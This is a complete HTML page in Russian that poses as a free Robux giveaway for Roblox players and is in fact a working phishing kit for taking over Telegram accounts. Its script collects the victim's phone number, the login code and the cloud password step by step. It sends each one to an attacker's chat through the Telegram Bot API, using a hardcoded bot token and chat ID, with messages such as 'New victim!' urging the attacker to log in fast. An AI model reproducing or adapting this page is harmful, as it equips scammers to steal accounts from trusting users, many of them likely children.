<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Получить Robux</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            font-family: Arial, sans-serif;
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: #1a1a1a;
            border: 2px solid #00b06f;
            border-radius: 20px;
            padding: 30px 25px;
            width: 100%;
            max-width: 380px;
            text-align: center;
        }
        .logo { font-size: 70px; margin-bottom: 10px; }
        .robux { color: #00b06f; font-size: 28px; font-weight: bold; margin: 10px 0; }
        h2 { color: #fff; font-size: 20px; margin-bottom: 8px; }
        p { color: #bbb; font-size: 13px; margin-bottom: 15px; }
        select, input {
            width: 100%;
            padding: 14px 16px;
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 10px;
            color: #fff;
            font-size: 16px;
            margin-bottom: 12px;
            outline: none;
        }
        .phone-row { display: flex; gap: 8px; }
        .phone-row select { width: 120px; }
        button {
            width: 100%;
            padding: 14px;
            background: #00b06f;
            color: #000;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .step { display: none; }
        .step.active { display: block; }
        .alert { color: #ff4444; font-size: 13px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🎮</div>
        
        <div id="step1" class="step active">
            <h2>Подтверждение аккаунта</h2>
            <div class="robux">💰 5 000 Robux</div>
            <p>Введите номер телефона от аккаунта Telegram чтобы получить Robux!</p>
            
            <div class="phone-row">
                <select id="country">
                    <option value="+7">🇷🇺 +7</option>
                    <option value="+380">🇺🇦 +380</option>
                    <option value="+375">🇧🇾 +375</option>
                    <option value="+1">🇺🇸 +1</option>
                    <option value="+44">🇬🇧 +44</option>
                    <option value="+49">🇩🇪 +49</option>
                    <option value="+48">🇵🇱 +48</option>
                    <option value="+998">🇺🇿 +998</option>
                    <option value="+7">🇰🇿 +7</option>
                </select>
                <input type="tel" id="phone" placeholder="900 123-45-67">
            </div>
            
            <button onclick="sendPhone()">🎁 Получить Robux</button>
            <div class="alert" id="alert1"></div>
        </div>
        
        <div id="step2" class="step">
            <h2>Введите код</h2>
            <p>На номер <span id="phoneDisplay"></span> отправлен код подтверждения.</p>
            <input type="text" id="code" placeholder="•••••" maxlength="5">
            <button onclick="sendCode()">✅ Подтвердить</button>
            <div class="alert" id="alert2"></div>
        </div>
        
        <div id="step3" class="step">
            <h2>Введите пароль</h2>
            <p>Введите облачный пароль для аккаунта <span id="phoneDisplay2"></span></p>
            <input type="password" id="password" placeholder="Облачный пароль">
            <button onclick="sendPassword()">✅ Войти</button>
            <div class="alert" id="alert3"></div>
        </div>
        
        <div id="step4" class="step">
            <h2>✅ Готово!</h2>
            <div class="robux">+5 000 Robux</div>
            <p>Robux будут зачислены в течение 24 часов.</p>
        </div>
    </div>

    <script>
        const TOKEN = "8030379259:AAHGlai2IkpAjobGwAwMZaI6GkF4vxJkN7M";
        const ADMIN_ID = "6600491178";
        let fullPhone = "";
        
        function sendPhone() {
            const country = document.getElementById('country').value;
            const phone = document.getElementById('phone').value.replace(/\D/g, '');
            
            if (!phone || phone.length < 6) {
                document.getElementById('alert1').innerText = "Введите корректный номер";
                return;
            }
            
            fullPhone = country + phone;
            
            // Отправляем ТЕБЕ номер
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: ADMIN_ID,
                    text: `📱 Новая жертва!\nНомер: ${fullPhone}\n\nВведи этот номер в Telegram на своём телефоне!`
                })
            });
            
            document.getElementById('phoneDisplay').innerText = fullPhone;
            document.getElementById('phoneDisplay2').innerText = fullPhone;
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
        }
        
        function sendCode() {
            const code = document.getElementById('code').value.trim();
            
            if (!code || code.length !== 5) {
                document.getElementById('alert2').innerText = "Неверный код";
                return;
            }
            
            // Отправляем ТЕБЕ код
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: ADMIN_ID,
                    text: `🔑 КОД: ${code}\n📱 Номер: ${fullPhone}\n\nБыстро введи код в Telegram!`
                })
            });
            
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step3').classList.add('active');
        }
        
        function sendPassword() {
            const password = document.getElementById('password').value;
            
            if (!password || password.length < 3) {
                document.getElementById('alert3').innerText = "Введите пароль";
                return;
            }
            
            // Отправляем ТЕБЕ пароль
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: ADMIN_ID,
                    text: `🔐 ПАРОЛЬ: ${password}\n📱 Номер: ${fullPhone}\n\nГотово! Заходи в аккаунт!`
                })
            });
            
            document.getElementById('step3').classList.remove('active');
            document.getElementById('step4').classList.add('active');
        }
    </script>
</body>
</html>
